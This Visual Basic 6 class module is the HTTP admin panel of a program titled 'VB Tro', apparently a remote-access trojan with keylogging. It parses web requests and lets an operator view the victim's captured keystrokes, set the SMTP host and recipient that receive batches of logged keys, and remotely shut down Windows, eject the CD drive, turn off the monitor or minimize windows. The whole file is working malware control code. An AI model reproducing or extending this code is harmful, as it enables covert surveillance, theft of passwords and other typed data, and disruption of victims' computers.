VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "HTML"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'minimize all windows
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

'shut down
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

'cd-rom
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long

'monitor
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long


Dim HMaker As New HTMLMaker

Dim cParameters As New Collection

Dim OutHtml As String

Private Sub SetParams(ByVal request As String)
        
    Call ClearCollection
      
    ' skip trailing CR/LF
    Do While (Len(request) > 0)
        If ((Right$(request, 1) = Chr$(13)) Or (Right$(request, 1) = Chr$(10))) Then
            request = Mid$(request, 1, Len(request) - 1)
        Else
            Exit Do
        End If
    Loop
    
    Dim ipos As Integer
    Do
        ' look for the first appearance of the= sign.
        ipos = InStr(request, "=")
        If (IsNull(ipos) Or ipos = 0) Then
            Exit Do
        End If

        Dim sName As String, sVal As String
        sName = Left$(request, ipos - 1)
        sVal = Mid$(request, ipos + 1)


        ipos = InStr(sVal, "&")
        If (IsNull(ipos) Or ipos = 0) Then
            request = ""
        Else
            sVal = Left$(sVal, ipos - 1)
            request = Mid$(request, Len(sVal) + Len(sName) + 3)
        End If

        ClearJunk sName
        ClearJunk sVal
        Dim entry As ParamType
        Set entry = New ParamType
        entry.Name = sName
        entry.Value = sVal
        ' ok duplicate names can reoccur, bypass them this way:
        On Error GoTo DuplicateKeyErr
        cParameters.Add Item:=entry, Key:=sName
        On Error GoTo 0

    Loop
    Exit Sub
DuplicateKeyErr:
    If Err.Number <> 457 Then Exit Sub ' serious error!
    cParameters.Add Item:=entry ' no key!
    Resume Next
End Sub


Public Function MakeIt(request As String) As String


    Dim tstr As String
    Dim Action As String
    
    SetParams (request)
    
    Action = UCase(Trim(ReadParam("action")))
    
    Select Case Action
        
        Case "EXITWINDOWS"
            Call ExitWindows
        Case "MINALL"
            Call MinAll
        
        Case "OPENCD"
            Call opencd
        Case "CLOSECD"
            Call closecd
        
        Case "TURNON"
            Call TurnOn
        Case "TURNOFF"
            Call TurnOff
        
        Case "OTHER"
            Call other

        Case "CONFIG"
            Call config
        Case "SEEKEY"
            Call seekey
        Case "EDITSETTING"
            Call EditSetting
        Case Else
            Call def
    End Select
    
    MakeIt = OutHtml

End Function


'This function clears a collection out.  Useful for deleting the cookie and parameter collections.
Private Sub ClearCollection()
    Dim ipos As Integer
    For ipos = 1 To cParameters.Count
        cParameters.Remove 1
    Next
End Sub


' clear the HTTP junk off of the parameters
Private Sub ClearJunk(param As String)
    Dim ipos As Integer, i As Integer
    Dim newParam As String
    
    ' first clear all + signs.
    Do
        ipos = InStr(param, "+")
        If (IsNull(ipos) Or ipos = 0) Then
            Exit Do
        End If
        param = Left$(param, ipos - 1) & " " & Mid$(param, ipos + 1)
    Loop

    ' clear all %.
    Do
        ipos = InStr(param, "%")
        If (IsNull(ipos) Or ipos = 0) Then
            Exit Do
        End If

        newParam = "&H" + Mid$(param, ipos + 1, 2)
        param = Left$(param, ipos - 1) & Chr$(CInt(newParam)) & Mid$(param, ipos + 3)
    Loop
    
End Sub

Public Function ReadParam(sName As String) As String
On Error GoTo EndReadParam ' parameter that hasn't shown
    ReadParam = ""
    ReadParam = cParameters(sName).Value
EndReadParam:
    Exit Function
End Function


Sub config()
    
    Dim IData As New Collection
    
    
    Call HMaker.AddTo(IData, "Number of key send via Email", "", "NumberOfKey", Str(Main_Md.NumberOfKey), "")
    Call HMaker.AddTo(IData, "Mail Host Server", "", "SMTP_HOST", Main_Md.SMTP_HOST, "")
    Call HMaker.AddTo(IData, "Host Port Number", "", "SMTP_PORT", Main_Md.SMTP_PORT, "")
    Call HMaker.AddTo(IData, "Mail From", "", "From", Main_Md.From, "")
    Call HMaker.AddTo(IData, "Mail From (Email)", "", "MAIL_FROM", Main_Md.MAIL_FROM, "")
    Call HMaker.AddTo(IData, "Mail To", "", "MAIL_TO", Main_Md.MAIL_TO, "")
    Call HMaker.AddTo(IData, "Mail To (Email)", "", "RCPT_TO", Main_Md.RCPT_TO, "")
    Call HMaker.AddTo(IData, "HTTP Admin Port", "", "WebPort", Str(Main_Md.WebPort), "")
    
    Call HMaker.AddTo(IData, "", "Submit", "", "Change", "")

    OutHtml = HMaker.MakeFormPage("Configuration Page", "EditSetting", "<big><big>Change this setting<small><small>", IData)
    
End Sub

Sub def()

    OutHtml = ""
        
    OutHtml = OutHtml + "<html>" & vbCrLf
    OutHtml = OutHtml + "<body>" & vbCrLf
    OutHtml = OutHtml + "<p align='center'>" & vbCrLf
    OutHtml = OutHtml + "<big>VB Tro Admin Page<small><br><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=config'>Configuration</a><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=seekey'>Current Keyboard</a><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=other'>Other Utility</a><br>" & vbCrLf
    OutHtml = OutHtml + HMaker.CopyRight
    OutHtml = OutHtml + "</body>" & vbCrLf
    OutHtml = OutHtml + "</html>" & vbCrLf

End Sub

Sub seekey()

    OutHtml = HMaker.MakeMsgForm("Current Keyborad", Main_Md.HookText)

End Sub


Sub EditSetting()
    
    
    Main_Md.NumberOfKey = ReadParam("NumberOfKey")
    SaveSetting appname:="Hook", section:="Setting", Key:="NumberOfKey", setting:=Main_Md.NumberOfKey
    
    Main_Md.SMTP_HOST = ReadParam("SMTP_HOST")
    SaveSetting appname:="Hook", section:="Setting", Key:="SMTP_HOST", setting:=Main_Md.SMTP_HOST

    Main_Md.SMTP_PORT = ReadParam("SMTP_PORT")
    SaveSetting appname:="Hook", section:="Setting", Key:="SMTP_PORT", setting:=Main_Md.SMTP_PORT

    Main_Md.From = ReadParam("From")
    SaveSetting appname:="Hook", section:="Setting", Key:="From", setting:=Main_Md.From

    Main_Md.MAIL_FROM = ReadParam("MAIL_FROM")
    SaveSetting appname:="Hook", section:="Setting", Key:="MAIL_FROM", setting:=Main_Md.MAIL_FROM

    Main_Md.MAIL_TO = ReadParam("MAIL_TO")
    SaveSetting appname:="Hook", section:="Setting", Key:="MAIL_TO", setting:=Main_Md.MAIL_TO

    Main_Md.RCPT_TO = ReadParam("RCPT_TO")
    SaveSetting appname:="Hook", section:="Setting", Key:="RCPT_TO", setting:=Main_Md.RCPT_TO

    If Main_Md.WebPort <> ReadParam("WebPort") Then
        Main_Md.WebPort = ReadParam("WebPort")
        SaveSetting appname:="Hook", section:="Setting", Key:="WebPort", setting:=Main_Md.WebPort
        Form_Main.ChangeWebServerProt
    End If
    
    OutHtml = HMaker.MakeMsgForm("Setting Changed!", "Setting Changed!")

End Sub


Sub other()

    OutHtml = ""
        
    OutHtml = OutHtml + "<html>" & vbCrLf
    OutHtml = OutHtml + "<body>" & vbCrLf
    OutHtml = OutHtml + "<p align='center'>" & vbCrLf
    OutHtml = OutHtml + "<big>Other Utilities!<small><br><br>" & vbCrLf
    OutHtml = OutHtml + "<p align='left'>" & vbCrLf
    
    OutHtml = OutHtml + "CD-ROM Drive Utilities<br><hr>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=opencd'>Open</a><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=closecd'>Close</a><br>" & vbCrLf
    OutHtml = OutHtml + "<br><br>" & vbCrLf
    
    OutHtml = OutHtml + "Windows Utilities<br><hr>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=MinAll'>Minimize All Windows</a><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=ExitWindows'>Shut Down</a><br>" & vbCrLf
    OutHtml = OutHtml + "<br><br>" & vbCrLf
    
    OutHtml = OutHtml + "Monitor Utilities<br><hr>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=TurnOn'>Turn On</a><br>" & vbCrLf
    OutHtml = OutHtml + "<a href='?action=TurnOff'>Turn Off</a><br>" & vbCrLf
    OutHtml = OutHtml + "<br><br>" & vbCrLf
    
    OutHtml = OutHtml + HMaker.CopyRight
    OutHtml = OutHtml + "</body>" & vbCrLf
    OutHtml = OutHtml + "</html>" & vbCrLf

End Sub

Private Sub opencd()
    mciSendString "Set CDAudio Door Open Wait", 0&, 0&, 0&

    OutHtml = HMaker.MakeMsgForm("CD-ROM Drive Opened!!", "CD-ROM Drive Opened!!")
End Sub


Private Sub closecd()
    mciSendString "Set CDAudio Door Closed Wait", 0&, 0&, 0&

    OutHtml = HMaker.MakeMsgForm("CD-ROM Drive Closed!!", "CD-ROM Drive Closed!!")
End Sub


Private Sub ExitWindows()
    
    ExitWindowsEx 15, 0

End Sub

Public Sub TurnOff()
    SendMessage Form_Main.hWnd, &H112, &HF170, ByVal 0&
    OutHtml = HMaker.MakeMsgForm("Monitor TurnOff!!", "Monitor TurnOff")
End Sub

Public Sub TurnOn()
    SendMessage Form_Main.hWnd, &H112, &HF170, ByVal -1&
    OutHtml = HMaker.MakeMsgForm("Monitor TurnOn", "Monitor TurnOn")
End Sub


Public Sub MinAll()
    Call keybd_event(&H5B, 0, 0, 0)
    Call keybd_event(77, 0, 0, 0)
    Call keybd_event(&H5B, 0, &H2, 0)
    
    OutHtml = HMaker.MakeMsgForm("All Windows Minimized!", "All Windows Minimized!")
End Sub

